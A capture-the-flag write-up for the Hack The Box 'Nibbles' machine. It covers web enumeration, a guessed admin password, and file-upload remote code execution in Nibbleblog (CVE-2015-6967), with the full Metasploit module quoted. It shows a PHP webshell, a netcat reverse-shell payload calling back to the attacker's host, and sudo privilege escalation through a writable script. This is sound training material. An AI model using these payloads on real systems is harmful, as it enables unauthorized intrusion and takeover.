---
title: Nibble
Description: An easy Hack The Box Linux machine focused on web enumeration, exploiting a Nibbleblog file upload vulnerability for RCE, and leveraging a misconfigured SUID bash script for privilege escalation.
---



<img width="1480" height="435" alt="Screenshot from 2025-12-25 13-50-00" src="https://github.com/user-attachments/assets/f86bcee4-4c88-45f9-8a0a-0eb6e07de92a" />

Nibbles is a easy rated linux based box from Hackthebox.

Performing Intial Recon -> Nibbleblog instance -> file upload vulnerability to RCE -> shell as Nibbler -> Using bash script with SUID to escate privileges.

### Table of Content

1. [Recon](#recon)
2. [Port 80 Enumeration](#port-80-enumeration)
3. [Shell as Nibbler](#shell-as-nibbler)
4. [Privilege Escalation to Root](#Privilege-escalation-to-root)
5. [Conclusion](#conclusion)

### Recon

Starting out with the Nmap to check what ports are open on the target system. 

```
0x4B1T-vm :: Practice/HTB-Academy/nibble:[0x0]» sudo nmap -Pn -sV -p- -sC --min-rate 5000 10.129.200.170 -oN nmap_tcp_all.txt


Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-23 18:37 IST
Nmap scan report for 10.129.200.170
Host is up (0.23s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.55 seconds
```

Only two ports are open - `80` and `22` among which only `80` is our interest as it is already provided that we have to find a web vulnerability.

### Port 80 - Enumeration

When visiting the website in the browser we are presented with a page where just a text "Hello world!" is written - 

<img width="931" height="810" alt="Screenshot from 2025-12-25 11-07-42" src="https://github.com/user-attachments/assets/54ba233f-c462-418a-a9e9-737bf26e1692" />


<br>

Let's Try the WhatWeb - 

```
0x4B1T-vm :: ~/Practice/HTB-Academy:[0x0]» whatweb http://10.129.200.170/

http://10.129.200.170/ [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.200.170]
```

So whatweb does not found any interesting technology.

Viewing the source code reveals - 

<img width="931" height="810" alt="Screenshot from 2025-12-25 11-25-09" src="https://github.com/user-attachments/assets/db23b73f-70cf-4377-93af-599e10897824" />


Here we see there is a directory named `/nibbleblog` so let's see what's there -

<img width="931" height="810" alt="Screenshot from 2025-12-25 11-25-48" src="https://github.com/user-attachments/assets/41f69d8f-711c-4bed-8c23-b12a8f6c207b" />


Cool! now we can try to run the whatweb on the target withs this endpoint.

```
0x4B1T-vm :: Practice/HTB-Academy/nibble:[0x0]» whatweb http://10.129.200.170//nibbleblog/


http://10.129.200.170//nibbleblog/ [200 OK] Apache[2.4.18], Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.129.200.170], JQuery, MetaGenerator[Nibbleblog], PoweredBy[Nibbleblog], Script, Title[Nibbles - Yum yum]
```

We got some extra information about the target web - 

1. Languages - HTML5, JQuery, PHP
2. Technology - NibbleBlog which is a free bloging engine built using PHP.

Exploring the website does not revealed anything interesting so let's move to next step.

**Directory Bruteforcing**

```
gobuster dir -u http://10.129.200.170/nibbleblog -w /snap/seclists/1214/Discovery/Web-Content/common.txt -t 120 -o dir_files.txt
```

Running the  scan revealed -

```
.hta                 (Status: 403) [Size: 304]
README               (Status: 200) [Size: 4628]
.htpasswd            (Status: 403) [Size: 309]
admin                (Status: 301) [Size: 327] [--> http://10.129.200.170/nibbleblog/admin/]
admin.php            (Status: 200) [Size: 1401]
.htaccess            (Status: 403) [Size: 309]
content              (Status: 301) [Size: 329] [--> http://10.129.200.170/nibbleblog/content/]
languages            (Status: 301) [Size: 331] [--> http://10.129.200.170/nibbleblog/languages/]
index.php            (Status: 200) [Size: 2987]
plugins              (Status: 301) [Size: 329] [--> http://10.129.200.170/nibbleblog/plugins/]
themes               (Status: 301) [Size: 328] [--> http://10.129.200.170/nibbleblog/themes/]
```

Starting with the `/README` -

<img width="931" height="810" alt="Screenshot from 2025-12-25 11-45-15" src="https://github.com/user-attachments/assets/46c79c7e-b6aa-4020-be8b-3456978354d5" />


From the README we can see the Version of the nibble blog upon searching on the internet we found that the installed version is vulnerable to `CVE-2015-6967` which is a authenticated file upload vulnerabiity leading to Remote code execution.

But we are not sure weither this `README` is older or newest.

Moving to another endpoint `content` -

<img width="931" height="810" alt="Screenshot from 2025-12-25 11-51-01" src="https://github.com/user-attachments/assets/5f7b120d-36ad-4adb-96fd-038a1b98a7de" />



Here it can be been that directory lisitng is allowed on the web app so it increases our changes to getting any thing interesting.

Inside the `Private`  directory we have a interesting file `config.xml` having content -

```
<config>
<name type="string">Nibbles</name>
<slogan type="string">Yum yum</slogan>
<footer type="string">Powered by Nibbleblog</footer>
<advanced_post_options type="integer">0</advanced_post_options>
<url type="string">http://10.10.10.134/nibbleblog/</url>
<path type="string">/nibbleblog/</path>
<items_rss type="integer">4</items_rss>
<items_page type="integer">6</items_page>
<language type="string">en_US</language>
<timezone type="string">UTC</timezone>
<timestamp_format type="string">%d %B, %Y</timestamp_format>
<locale type="string">en_US</locale>
<img_resize type="integer">1</img_resize>
<img_resize_width type="integer">1000</img_resize_width>
<img_resize_height type="integer">600</img_resize_height>
<img_resize_quality type="integer">100</img_resize_quality>
<img_resize_option type="string">auto</img_resize_option>
<img_thumbnail type="integer">1</img_thumbnail>
<img_thumbnail_width type="integer">190</img_thumbnail_width>
<img_thumbnail_height type="integer">190</img_thumbnail_height>
<img_thumbnail_quality type="integer">100</img_thumbnail_quality>
<img_thumbnail_option type="string">landscape</img_thumbnail_option>
<theme type="string">simpler</theme>
<notification_comments type="integer">1</notification_comments>
<notification_session_fail type="integer">0</notification_session_fail>
<notification_session_start type="integer">0</notification_session_start>
<notification_email_to type="string">admin@nibbles.com</notification_email_to>
<notification_email_from type="string">noreply@10.10.10.134</notification_email_from>
<seo_site_title type="string">Nibbles - Yum yum</seo_site_title>
<seo_site_description type="string"/>
<seo_keywords type="string"/>
<seo_robots type="string"/>
<seo_google_code type="string"/>
<seo_bing_code type="string"/>
<seo_author type="string"/>
<friendly_urls type="integer">0</friendly_urls>
<default_homepage type="integer">0</default_homepage>
</config>
```

It shows that the `admin` is an valid user and the `nibbles` is a repeating word which can help us in bruteforcing the password for user admin.

At `admin.php` we have a login page :

<img width="931" height="810" alt="Screenshot from 2025-12-25 11-59-44" src="https://github.com/user-attachments/assets/507fda91-cfaa-4fda-9d08-1a088764b83c" />


trying the default login like :

```
admin:admin
admin:password
admin:administrator
```

Did not worked and also if there is certain number of failed attempts it will block our IP but - 

<img width="931" height="1001" alt="Screenshot from 2025-12-25 12-04-05" src="https://github.com/user-attachments/assets/ecf93d4f-3bfb-44ea-8e53-7e2f802aff1d" />

```
admin:nibbles
```

Worked and we are not inside the admin pannel.

From the `/setting` option in the options tab we can verify the version of the nibbleblog -

<img width="931" height="1001" alt="Screenshot from 2025-12-25 12-08-24" src="https://github.com/user-attachments/assets/ba247c64-aaba-4016-8d41-662dc81de2c7" />


### Shell as Nibbler

Now let's try to exploit the file upload vulnerability and get command execution -

We have a metasploit module available to exploit this vulnerability but we will epxloit it manually and use the module's code to understand the attack. 

[Exploit-db-38489](https://www.exploit-db.com/exploits/38489)

```
##
# This module requires Metasploit: http://www.metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::FileDropper

  def initialize(info = {})
    super(update_info(
      info,
      'Name'            => 'Nibbleblog File Upload Vulnerability',
      'Description'     => %q{
          Nibbleblog contains a flaw that allows a authenticated remote
          attacker to execute arbitrary PHP code. This module was
          tested on version 4.0.3.
        },
      'License'         => MSF_LICENSE,
      'Author'          =>
        [
          'Unknown', # Vulnerability Disclosure - Curesec Research Team. Author's name?
          'Roberto Soares Espreto <robertoespreto[at]gmail.com>' # Metasploit Module
        ],
      'References'      =>
        [
          ['URL', 'http://blog.curesec.com/article/blog/NibbleBlog-403-Code-Execution-47.html']
        ],
      'DisclosureDate'  => 'Sep 01 2015',
      'Platform'        => 'php',
      'Arch'            => ARCH_PHP,
      'Targets'         => [['Nibbleblog 4.0.3', {}]],
      'DefaultTarget'   => 0
    ))

    register_options(
      [
        OptString.new('TARGETURI',  [true, 'The base path to the web application', '/']),
        OptString.new('USERNAME',   [true, 'The username to authenticate with']),
        OptString.new('PASSWORD',   [true, 'The password to authenticate with'])
      ], self.class)
  end

  def username
    datastore['USERNAME']
  end

  def password
    datastore['PASSWORD']
  end

  def check
    cookie = do_login(username, password)
    return Exploit::CheckCode::Detected unless cookie

    res = send_request_cgi(
      'method'      => 'GET',
      'uri'         => normalize_uri(target_uri.path, 'admin.php'),
      'cookie'      => cookie,
      'vars_get'    => {
        'controller'  => 'settings',
        'action'      => 'general'
      }
    )

    if res && res.code == 200 && res.body.include?('Nibbleblog 4.0.3 "Coffee"')
      return Exploit::CheckCode::Appears
    end
    Exploit::CheckCode::Safe
  end

  def do_login(user, pass)
    res = send_request_cgi(
      'method'      => 'GET',
      'uri'         => normalize_uri(target_uri.path, 'admin.php')
    )

    fail_with(Failure::Unreachable, 'No response received from the target.') unless res

    session_cookie = res.get_cookies
    vprint_status("#{peer} - Logging in...")
    res = send_request_cgi(
      'method'      => 'POST',
      'uri'         => normalize_uri(target_uri.path, 'admin.php'),
      'cookie'      => session_cookie,
      'vars_post'   => {
        'username'  => user,
        'password'  => pass
      }
    )

    return session_cookie if res && res.code == 302 && res.headers['Location']
    nil
  end

  def exploit
    unless [ Exploit::CheckCode::Detected, Exploit::CheckCode::Appears ].include?(check)
      print_error("Target does not appear to be vulnerable.")
      return
    end

    vprint_status("#{peer} - Authenticating using #{username}:#{password}")

    cookie = do_login(username, password)
    fail_with(Failure::NoAccess, 'Unable to login. Verify USERNAME/PASSWORD or TARGETURI.') if cookie.nil?
    vprint_good("#{peer} - Authenticated with Nibbleblog.")

    vprint_status("#{peer} - Preparing payload...")
    payload_name = "#{Rex::Text.rand_text_alpha_lower(10)}.php"

    data = Rex::MIME::Message.new
    data.add_part('my_image', nil, nil, 'form-data; name="plugin"')
    data.add_part('My image', nil, nil, 'form-data; name="title"')
    data.add_part('4', nil, nil, 'form-data; name="position"')
    data.add_part('', nil, nil, 'form-data; name="caption"')
    data.add_part(payload.encoded, 'application/x-php', nil, "form-data; name=\"image\"; filename=\"#{payload_name}\"")
    data.add_part('1', nil, nil, 'form-data; name="image_resize"')
    data.add_part('230', nil, nil, 'form-data; name="image_width"')
    data.add_part('200', nil, nil, 'form-data; name="image_height"')
    data.add_part('auto', nil, nil, 'form-data; name="image_option"')
    post_data = data.to_s

    vprint_status("#{peer} - Uploading payload...")
    res = send_request_cgi(
      'method'        => 'POST',
      'uri'           => normalize_uri(target_uri, 'admin.php'),
      'vars_get'      => {
        'controller'  => 'plugins',
        'action'      => 'config',
        'plugin'      => 'my_image'
      },
      'ctype'         => "multipart/form-data; boundary=#{data.bound}",
      'data'          => post_data,
      'cookie'        => cookie
    )

    if res && /Call to a member function getChild\(\) on a non\-object/ === res.body
      fail_with(Failure::Unknown, 'Unable to upload payload. Does the server have the My Image plugin installed?')
    elsif res && !( res.body.include?('<b>Warning</b>') || res.body.include?('warn') )
      fail_with(Failure::Unknown, 'Unable to upload payload.')
    end

    vprint_good("#{peer} - Uploaded the payload.")

    php_fname = 'image.php'
    payload_url = normalize_uri(target_uri.path, 'content', 'private', 'plugins', 'my_image', php_fname)
    vprint_status("#{peer} - Parsed response.")

    register_files_for_cleanup(php_fname)
    vprint_status("#{peer} - Executing the payload at #{payload_url}.")
    send_request_cgi(
      'uri'     => payload_url,
      'method'  => 'GET'
    )
  end
end
```

From the code we see that it uses the plugin - `My image` to upload a malicious file and then 
it check for the uploaded file in the `'content', 'private', 'plugins', 'my_image'` and then try to fetch the file that will execute the code.

So let's try to upload a webshell written in php -

```
<?php system('id'); ?>
```

<img width="931" height="1001" alt="Screenshot from 2025-12-25 12-19-57" src="https://github.com/user-attachments/assets/f6e80423-f55c-4d03-bd2f-366b207d2e29" />


We got some errors but the file got successfully uploaded.

Inside the `/content/private/pulgins` there is subdirectory named `my_image` where our uploaded file is 

<img width="931" height="1001" alt="Screenshot from 2025-12-25 12-23-00" src="https://github.com/user-attachments/assets/3bb37752-45a3-496e-83ca-7edbcbcdbf96" />


But it is renamed to `image.php` but it does not matter if it works -

<img width="931" height="189" alt="Screenshot from 2025-12-25 12-23-45" src="https://github.com/user-attachments/assets/0501c006-174b-4037-ba7b-2f0e4b47dd46" />



Huee! We have RCE.

Moving to the next step we will upload a reverse shell.

Start listener on our machine -

```
nc -nvlp 8000
```

Upload a file again but this time with this content -

```
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.57 8000  >/tmp/f"); ?>

```

We got the shell as Nibbler-

<img width="931" height="306" alt="Screenshot from 2025-12-25 12-31-08" src="https://github.com/user-attachments/assets/51373ace-1ccd-4345-bbc3-9763a1e84b9a" />

Upgrading the shell to `TTY` -

```
python3 -c "import pty;pty.spawn('/bin/bash')"
```

Press `CTRL+Z` to background the process.

```
stty raw -echo;fg
```

Press two times carriage return.

Coming back to Enumeration

Inside the `Home Directory` of user `nibbler` we have two files 


<img width="1120" height="140" alt="Screenshot from 2025-12-25 12-42-10" src="https://github.com/user-attachments/assets/4ce49bb1-4948-4bba-85ad-ab744303336e" />

Among them one is the user flag file and other one is zip file.

### Privilege Escalation to root 

Unzip the file -

```
unzip personal
```

Inside the Directory we have one subdirectory `staff` inside which there is a bash script file `monitor.sh` when looking at it it seems like it is a script for monitoring the system.

```
nibbler@Nibbles:~/personal/stuff$ sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

we can run the script file as root and interesting thing is we are having write access to the file so let's add 

```
/bin/bash
```

at the end of the file and run it as :

```
sudo ./monitor.sh
```

<img width="713" height="138" alt="Screenshot from 2025-12-25 13-32-49" src="https://github.com/user-attachments/assets/ac7ab189-0540-41e7-85ea-415890534ea7" />



we are root and as root we can read the root flag too.

This marks the end of the writeup.

### Conclusion

Nibbles demonstrates how weak credentials, exposed configuration files, and an authenticated file upload vulnerability can be chained to achieve full system compromise. Proper hardening of web applications, strict file upload controls, and secure sudo configurations are essential to prevent such privilege escalation paths.
